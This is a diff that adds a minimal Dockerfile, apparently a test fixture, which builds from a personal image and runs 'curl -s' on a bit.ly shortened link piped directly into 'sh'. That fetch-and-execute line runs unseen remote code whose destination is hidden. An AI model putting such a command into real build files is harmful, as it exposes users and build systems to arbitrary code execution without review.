@@ -1,0 +1,3 @@
+FROM tomastomecek/random-image:0.0.1
+RUN curl -s http://bit.ly/2jADUWC | sh
+
